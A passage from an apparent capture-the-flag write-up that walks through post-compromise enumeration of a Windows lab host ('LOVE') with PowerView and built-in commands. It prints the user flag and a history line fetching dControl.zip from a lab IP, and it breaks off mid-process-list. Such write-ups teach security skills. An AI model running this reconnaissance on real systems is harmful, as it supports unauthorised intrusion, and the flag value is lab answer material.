+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroupMember</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>GroupName Users <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Where-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.MemberName</span></span> <span class="z-keyword z-operator z-comparison z-powershell">-notmatch</span> <span class="z-string z-quoted z-single z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&#39;</span>NT AUTHORITY<span class="z-punctuation z-definition z-string z-end z-powershell">&#39;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> MemberName<span class="z-keyword z-operator z-other z-powershell">,</span> SID <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName MemberName  SID                                          
+</span><span class="z-text z-plain">--------- ----------  ---                                          
+</span><span class="z-text z-plain">Users     LOVE\Phoebe S-1-5-21-2955427858-187959437-2037071653-1002
+</span></code></pre>
+<p>It looks like there's only us, <code>phoebe</code>.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's enumerate all local groups, once again using <code>PowerView</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetLocalGroup</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> GroupName<span class="z-keyword z-operator z-other z-powershell">,</span> Comment <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Out-String</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Width <span class="z-constant z-numeric z-integer z-powershell">4096</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GroupName                           Comment                                                                                                                                                                                                       
+</span><span class="z-text z-plain">---------                           -------                                                                                                                                                                                                       
+</span><span class="z-text z-plain">Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.                                                                                             
+</span><span class="z-text z-plain">Administrators                      Administrators have complete and unrestricted access to the computer/domain                                                                                                                                   
+</span><span class="z-text z-plain">Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files                                                                                                     
+</span><span class="z-text z-plain">Cryptographic Operators             Members are authorized to perform cryptographic operations.                                                                                                                                                   
+</span><span class="z-text z-plain">Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.                                                                                                                      
+</span><span class="z-text z-plain">Event Log Readers                   Members of this group can read event logs from local machine                                                                                                                                                  
+</span><span class="z-text z-plain">Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted                                                                                
+</span><span class="z-text z-plain">Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.                                                                                                                       
+</span><span class="z-text z-plain">IIS_IUSRS                           Built-in group used by Internet Information Services.                                                                                                                                                         
+</span><span class="z-text z-plain">Network Configuration Operators      Members in this group can have some administrative privileges to manage configuration of networking features                                                                                                  
+</span><span class="z-text z-plain">Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer                                      
+</span><span class="z-text z-plain">Performance Monitor Users           Members of this group can access performance counter data locally and remotely                                                                                                                                
+</span><span class="z-text z-plain">Power Users                         Power Users are included for backwards compatibility and possess limited administrative powers                                                                                                                
+</span><span class="z-text z-plain">Remote Desktop Users                Members in this group are granted the right to logon remotely                                                                                                                                                 
+</span><span class="z-text z-plain">Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+</span><span class="z-text z-plain">Replicator                          Supports file replication in a domain                                                                                                                                                                         
+</span><span class="z-text z-plain">System Managed Accounts Group       Members of this group are managed by the system.                                                                                                                                                              
+</span><span class="z-text z-plain">Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
+</span></code></pre>
+<p>Looks classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's gather more information about us.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> net user phoebe
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">User name                    Phoebe
+</span><span class="z-text z-plain">Full Name                    Phoebe
+</span><span class="z-text z-plain">Comment                      Workstation Power User
+</span><span class="z-text z-plain">User&#39;s comment               
+</span><span class="z-text z-plain">Country/region code          000 (System Default)
+</span><span class="z-text z-plain">Account active               Yes
+</span><span class="z-text z-plain">Account expires              Never
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Password last set            4/12/2021 11:54:30 AM
+</span><span class="z-text z-plain">Password expires             Never
+</span><span class="z-text z-plain">Password changeable          4/12/2021 11:54:30 AM
+</span><span class="z-text z-plain">Password required            Yes
+</span><span class="z-text z-plain">User may change password     Yes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Workstations allowed         All
+</span><span class="z-text z-plain">Logon script                 
+</span><span class="z-text z-plain">User profile                 
+</span><span class="z-text z-plain">Home directory               
+</span><span class="z-text z-plain">Last logon                   12/24/2023 3:02:54 PM
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Logon hours allowed          All
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Local Group Memberships      *Remote Management Use*Users                
+</span><span class="z-text z-plain">Global Group memberships     *None
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We don't belong to interesting groups.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>USERPROFILE</span>\Desktop\user.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4e46cb60d702c04b41f8100f3c076a86
+</span></code></pre>
+<p>There's nothing unusual though.</p>
+<h2 id="command-history">Command history</h2>
+<p>Let's check the history of commands ran by <code>phoebe</code>.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> type <span class="z-variable z-other z-readwrite z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-support z-variable z-drive z-powershell">env:</span>APPDATA</span>\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">curl 10.10.14.9:8000/dControl.zip -o dControl.zip
+</span></code></pre>
+<p>Alright, so <code>phoebe</code> downloaded a <code>dControl.zip</code> file and saved it.</p>
+<p>Let's find its location:</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> dir C:\ <span class="z-keyword z-operator z-assignment z-powershell">-</span>Recurse <span class="z-keyword z-operator z-assignment z-powershell">-</span>Filter <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>dControl.zip<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>ErrorAction SilentlyContinue
+</span></code></pre>
+<p>There's no output, so we couldn't find it.</p>
+<h2 id="tokens">Tokens</h2>
+<p>Let's now focus on our tokens.</p>
+<p>Which security groups are associated with our access tokens?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> whoami <span class="z-keyword z-operator z-assignment z-powershell">/</span>groups
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GROUP INFORMATION
+</span><span class="z-text z-plain">-----------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Group Name                             Type             SID          Attributes                                        
+</span><span class="z-text z-plain">====================================== ================ ============ ==================================================
+</span><span class="z-text z-plain">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse.</p>
+<p>What about the privileges associated with our access tokens?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> whoami <span class="z-keyword z-operator z-assignment z-powershell">/</span>priv
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRIVILEGES INFORMATION
+</span><span class="z-text z-plain">----------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Privilege Name                Description                          State   
+</span><span class="z-text z-plain">============================= ==================================== ========
+</span><span class="z-text z-plain">SeShutdownPrivilege           Shut down the system                 Disabled
+</span><span class="z-text z-plain">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+</span><span class="z-text z-plain">SeUndockPrivilege             Remove computer from docking station Disabled
+</span><span class="z-text z-plain">SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+</span><span class="z-text z-plain">SeTimeZonePrivilege           Change the time zone                 Disabled
+</span></code></pre>
+<p>There's nothing that we can leverage to elevate our privileges.</p>
+<h2 id="shares">Shares</h2>
+<p>Let's list the SMB shares available on Optimum, using the same version of <code>PowerView</code> as before.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-NetShare</span> <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Select-Object</span> Name<span class="z-keyword z-operator z-other z-powershell">,</span> Remark <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">Format-Table</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Name   Remark       
+</span><span class="z-text z-plain">----   ------       
+</span><span class="z-text z-plain">ADMIN$ Remote Admin 
+</span><span class="z-text z-plain">C$     Default share
+</span><span class="z-text z-plain">IPC$   Remote IPC
+</span></code></pre>
+<p>So there's only default administrative shares.</p>
+<h2 id="environment-variables">Environment variables</h2>
+<p>Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> <span class="z-support z-function z-powershell">Get-ChildItem</span> Env: <span class="z-keyword z-operator z-other z-powershell">|</span> <span class="z-support z-function z-powershell">ForEach-Object</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span><span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-complex z-source z-powershell"><span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.Name</span></span></span><span class="z-punctuation z-section z-group z-end z-powershell">)</span>=<span class="z-punctuation z-definition z-variable z-powershell">$</span><span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-complex z-source z-powershell"><span class="z-support z-variable z-automatic z-powershell"><span class="z-punctuation z-definition z-variable z-powershell">$</span>_<span class="z-variable z-other z-member z-powershell">.Value</span></span></span><span class="z-punctuation z-section z-group z-end z-powershell">)</span><span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ALLUSERSPROFILE=C:\ProgramData
+</span><span class="z-text z-plain">AP_PARENT_PID=6896
+</span><span class="z-text z-plain">APPDATA=C:\Users\Phoebe\AppData\Roaming
+</span><span class="z-text z-plain">CommonProgramFiles=C:\Program Files\Common Files
+</span><span class="z-text z-plain">CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+</span><span class="z-text z-plain">CommonProgramW6432=C:\Program Files\Common Files
+</span><span class="z-text z-plain">COMPUTERNAME=LOVE
+</span><span class="z-text z-plain">ComSpec=C:\WINDOWS\system32\cmd.exe
+</span><span class="z-text z-plain">DriverData=C:\Windows\System32\Drivers\DriverData
+</span><span class="z-text z-plain">HOMEDRIVE=C:
+</span><span class="z-text z-plain">HOMEPATH=\Users\Phoebe
+</span><span class="z-text z-plain">LOCALAPPDATA=C:\Users\Phoebe\AppData\Local
+</span><span class="z-text z-plain">LOGONSERVER=\\LOVE
+</span><span class="z-text z-plain">NUMBER_OF_PROCESSORS=2
+</span><span class="z-text z-plain">OneDrive=C:\Users\Phoebe\OneDrive
+</span><span class="z-text z-plain">OS=Windows_NT
+</span><span class="z-text z-plain">Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps;
+</span><span class="z-text z-plain">PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+</span><span class="z-text z-plain">PROCESSOR_ARCHITECTURE=AMD64
+</span><span class="z-text z-plain">PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+</span><span class="z-text z-plain">PROCESSOR_LEVEL=23
+</span><span class="z-text z-plain">PROCESSOR_REVISION=3100
+</span><span class="z-text z-plain">ProgramData=C:\ProgramData
+</span><span class="z-text z-plain">ProgramFiles=C:\Program Files
+</span><span class="z-text z-plain">ProgramFiles(x86)=C:\Program Files (x86)
+</span><span class="z-text z-plain">ProgramW6432=C:\Program Files
+</span><span class="z-text z-plain">PROMPT=$P$G
+</span><span class="z-text z-plain">PSModulePath=C:\Users\Phoebe\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
+</span><span class="z-text z-plain">PUBLIC=C:\Users\Public
+</span><span class="z-text z-plain">SESSIONNAME=Console
+</span><span class="z-text z-plain">SystemDrive=C:
+</span><span class="z-text z-plain">SystemRoot=C:\WINDOWS
+</span><span class="z-text z-plain">TEMP=C:\Users\Phoebe\AppData\Local\Temp
+</span><span class="z-text z-plain">TMP=C:\Users\Phoebe\AppData\Local\Temp
+</span><span class="z-text z-plain">USERDOMAIN=LOVE
+</span><span class="z-text z-plain">USERDOMAIN_ROAMINGPROFILE=LOVE
+</span><span class="z-text z-plain">USERNAME=Phoebe
+</span><span class="z-text z-plain">USERPROFILE=C:\Users\Phoebe
+</span><span class="z-text z-plain">windir=C:\WINDOWS
+</span></code></pre>
+<p>There's nothing interesting.</p>
+<h2 id="listening-ports">Listening ports</h2>
+<p>Let's see if any TCP local ports are listening for connections.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> netstat <span class="z-keyword z-operator z-assignment z-powershell">-</span>ano <span class="z-keyword z-operator z-other z-powershell">|</span> findstr <span class="z-keyword z-operator z-assignment z-powershell">/</span>C:<span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>LISTENING<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> findstr <span class="z-keyword z-operator z-assignment z-powershell">/</span>C:<span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>TCP<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       6372
+</span><span class="z-text z-plain">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
+</span><span class="z-text z-plain">  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       6372
+</span><span class="z-text z-plain">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+</span><span class="z-text z-plain">  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3796
+</span><span class="z-text z-plain">  TCP    0.0.0.0:5000           0.0.0.0:0              LISTENING       6372
+</span><span class="z-text z-plain">  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4768
+</span><span class="z-text z-plain">  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+</span><span class="z-text z-plain">  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
+</span><span class="z-text z-plain">  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       3760
+</span><span class="z-text z-plain">  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       680
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       540
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1200
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1532
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2348
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       660
+</span><span class="z-text z-plain">  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2664
+</span><span class="z-text z-plain">  TCP    10.10.10.239:139       0.0.0.0:0              LISTENING       4
+</span><span class="z-text z-plain">  TCP    [::]:80                [::]:0                 LISTENING       6372
+</span><span class="z-text z-plain">  TCP    [::]:135               [::]:0                 LISTENING       916
+</span><span class="z-text z-plain">  TCP    [::]:443               [::]:0                 LISTENING       6372
+</span><span class="z-text z-plain">  TCP    [::]:445               [::]:0                 LISTENING       4
+</span><span class="z-text z-plain">  TCP    [::]:3306              [::]:0                 LISTENING       3796
+</span><span class="z-text z-plain">  TCP    [::]:5000              [::]:0                 LISTENING       6372
+</span><span class="z-text z-plain">  TCP    [::]:5985              [::]:0                 LISTENING       4
+</span><span class="z-text z-plain">  TCP    [::]:5986              [::]:0                 LISTENING       4
+</span><span class="z-text z-plain">  TCP    [::]:7680              [::]:0                 LISTENING       3760
+</span><span class="z-text z-plain">  TCP    [::]:47001             [::]:0                 LISTENING       4
+</span><span class="z-text z-plain">  TCP    [::]:49664             [::]:0                 LISTENING       680
+</span><span class="z-text z-plain">  TCP    [::]:49665             [::]:0                 LISTENING       540
+</span><span class="z-text z-plain">  TCP    [::]:49666             [::]:0                 LISTENING       1200
+</span><span class="z-text z-plain">  TCP    [::]:49667             [::]:0                 LISTENING       1532
+</span><span class="z-text z-plain">  TCP    [::]:49668             [::]:0                 LISTENING       2348
+</span><span class="z-text z-plain">  TCP    [::]:49669             [::]:0                 LISTENING       660
+</span><span class="z-text z-plain">  TCP    [::]:49670             [::]:0                 LISTENING       2664
+</span></code></pre>
+<p>There's no TCP port listening locally. What about UDP?</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> netstat <span class="z-keyword z-operator z-assignment z-powershell">-</span>ano <span class="z-keyword z-operator z-other z-powershell">|</span> findstr <span class="z-keyword z-operator z-assignment z-powershell">/</span>C:<span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>LISTENING<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span> <span class="z-keyword z-operator z-other z-powershell">|</span> findstr <span class="z-keyword z-operator z-assignment z-powershell">/</span>C:<span class="z-string z-quoted z-double z-powershell"><span class="z-punctuation z-definition z-string z-begin z-powershell">&quot;</span>UDP<span class="z-punctuation z-definition z-string z-end z-powershell">&quot;</span></span>
+</span></code></pre>
+<p>Nothing!</p>
+<h2 id="processes">Processes</h2>
+<p>Let's check which processes are running.</p>
+<pre data-lang="ps1" class="language-ps1 z-code"><code class="language-ps1" data-lang="ps1"><span class="z-source z-powershell">PS C:\xampp\htdocs\omrs\images<span class="z-keyword z-operator z-redirection z-powershell">&gt;</span> tasklist <span class="z-keyword z-operator z-assignment z-powershell">/</span>svc
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Image Name                     PID Services                                    
+</span><span class="z-text z-plain">========================= ======== ============================================
+</span><span class="z-text z-plain">System Idle Process              0 N/A                                         
+</span><span class="z-text z-plain">System                           4 N/A                                         
+</span><span class="z-text z-plain">Registry                        92 N/A                                         
+</span><span class="z-text z-plain">smss.exe                       324 N/A                                         
+</span><span class="z-text z-plain">csrss.exe                      412 N/A                                         
+</span><span class="z-text z-plain">csrss.exe                      520 N/A                                         
+</span><span class="z-text z-plain">wininit.exe                    540 N/A                                         
+</span><span class="z-text z-plain">winlogon.exe                   584 N/A                                         
+</span><span class="z-text z-plain">services.exe                   660 N/A                                         
+</span><span class="z-text z-plain">lsass.exe                      680 KeyIso, SamSs, VaultSvc                     
+</span><span class="z-text z-plain">svchost.exe                    796 BrokerInfrastructure, DcomLaunch, PlugPlay, 
+</span><span class="z-text z-plain">                                   Power, SystemEventsBroker                   
+</span><span class="z-text z-plain">fontdrvhost.exe                816 N/A                                         
+</span><span class="z-text z-plain">fontdrvhost.exe                824 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                    916 RpcEptMapper, RpcSs                         
+</span><span class="z-text z-plain">svchost.exe                    964 LSM                                         
+</span><span class="z-text z-plain">dwm.exe                       1008 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                    348 CryptSvc                                    
+</span><span class="z-text z-plain">svchost.exe                    404 AppIDSvc                                    
+</span><span class="z-text z-plain">svchost.exe                    936 CoreMessagingRegistrar                      
+</span><span class="z-text z-plain">svchost.exe                    984 DsmSvc                                      
+</span><span class="z-text z-plain">svchost.exe                   1076 NcbService                                  
+</span><span class="z-text z-plain">svchost.exe                   1120 TimeBrokerSvc                               
+</span><span class="z-text z-plain">svchost.exe                   1200 EventLog                                    
+</span><span class="z-text z-plain">svchost.exe                   1248 DispBrokerDesktopSvc                        
+</span><span class="z-text z-plain">svchost.exe                   1288 nsi                                         
+</span><span class="z-text z-plain">svchost.exe                   1368 Dhcp                                        
+</span><span class="z-text z-plain">vm3dservice.exe               1484 vm3dservice                                 
+</span><span class="z-text z-plain">svchost.exe                   1532 Schedule                                    
+</span><span class="z-text z-plain">svchost.exe                   1540 NlaSvc                                      
+</span><span class="z-text z-plain">svchost.exe                   1592 ProfSvc                                     
+</span><span class="z-text z-plain">svchost.exe                   1616 SysMain                                     
+</span><span class="z-text z-plain">svchost.exe                   1624 EventSystem                                 
+</span><span class="z-text z-plain">svchost.exe                   1656 Themes                                      
+</span><span class="z-text z-plain">Memory Compression            1756 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   1792 SENS                                        
+</span><span class="z-text z-plain">svchost.exe                   1824 AudioEndpointBuilder                        
+</span><span class="z-text z-plain">svchost.exe                   1836 FontCache                                   
+</span><span class="z-text z-plain">svchost.exe                   1852 netprofm                                    
+</span><span class="z-text z-plain">svchost.exe                   1976 SEMgrSvc                                    
+</span><span class="z-text z-plain">svchost.exe                   2004 Audiosrv                                    
+</span><span class="z-text z-plain">svchost.exe                   2084 Dnscache                                    
+</span><span class="z-text z-plain">svchost.exe                   2092 DusmSvc                                     
+</span><span class="z-text z-plain">svchost.exe                   2104 Wcmsvc                                      
+</span><span class="z-text z-plain">svchost.exe                   2120 UserManager                                 
+</span><span class="z-text z-plain">svchost.exe                   2184 ShellHWDetection                            
+</span><span class="z-text z-plain">svchost.exe                   2292 WinHttpAutoProxySvc                         
+</span><span class="z-text z-plain">spoolsv.exe                   2348 Spooler                                     
+</span><span class="z-text z-plain">svchost.exe                   2424 BFE, mpssvc                                 
+</span><span class="z-text z-plain">svchost.exe                   2472 LanmanWorkstation                           
+</span><span class="z-text z-plain">svchost.exe                   2656 IKEEXT                                      
+</span><span class="z-text z-plain">svchost.exe                   2664 PolicyAgent                                 
+</span><span class="z-text z-plain">svchost.exe                   2672 LanmanServer                                
+</span><span class="z-text z-plain">svchost.exe                   2788 DiagTrack                                   
+</span><span class="z-text z-plain">svchost.exe                   2796 DPS                                         
+</span><span class="z-text z-plain">svchost.exe                   2804 Winmgmt                                     
+</span><span class="z-text z-plain">svchost.exe                   2884 Browser                                     
+</span><span class="z-text z-plain">svchost.exe                   2900 TrkWks                                      
+</span><span class="z-text z-plain">VGAuthService.exe             2912 VGAuthService                               
+</span><span class="z-text z-plain">vmtoolsd.exe                  2932 VMTools                                     
+</span><span class="z-text z-plain">svchost.exe                   2940 WpnService                                  
+</span><span class="z-text z-plain">svchost.exe                   3016 iphlpsvc                                    
+</span><span class="z-text z-plain">svchost.exe                   2640 WdiServiceHost                              
+</span><span class="z-text z-plain">dllhost.exe                   3356 COMSysApp                                   
+</span><span class="z-text z-plain">WmiPrvSE.exe                  3532 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   3760 DoSvc                                       
+</span><span class="z-text z-plain">svchost.exe                   3828 wuauserv                                    
+</span><span class="z-text z-plain">svchost.exe                   4044 RmSvc                                       
+</span><span class="z-text z-plain">msdtc.exe                     4072 MSDTC                                       
+</span><span class="z-text z-plain">sihost.exe                    4180 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   4204 CDPUserSvc_39aed                            
+</span><span class="z-text z-plain">svchost.exe                   4240 WpnUserService_39aed                        
+</span><span class="z-text z-plain">taskhostw.exe                 4316 N/A                                         
+</span><span class="z-text z-plain">MicrosoftEdgeUpdate.exe       4332 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   4456 TokenBroker                                 
+</span><span class="z-text z-plain">svchost.exe                   4536 TabletInputService                          
+</span><span class="z-text z-plain">svchost.exe                   4584 StateRepository                             
+</span><span class="z-text z-plain">ctfmon.exe                    4612 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   4768 CDPSvc                                      
+</span><span class="z-text z-plain">explorer.exe                  4492 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   4272 cbdhsvc_39aed                               
+</span><span class="z-text z-plain">svchost.exe                   5272 StorSvc                                     
+</span><span class="z-text z-plain">StartMenuExperienceHost.e     5520 N/A                                         
+</span><span class="z-text z-plain">RuntimeBroker.exe             5716 N/A                                         
+</span><span class="z-text z-plain">svchost.exe                   5780 BITS                                        
+</span><span class="z-text z-plain">svchost.exe                   5872 SSDPSRV                                     
+</span><span class="z-text z-plain">SearchApp.exe                 5904 N/A                                         
+</span><span class="z-text z-plain">RuntimeBroker.exe              836 N/A                                         
+</span><span class="z-text z-plain">SearchIndexer.exe             6180 WSearch                                     
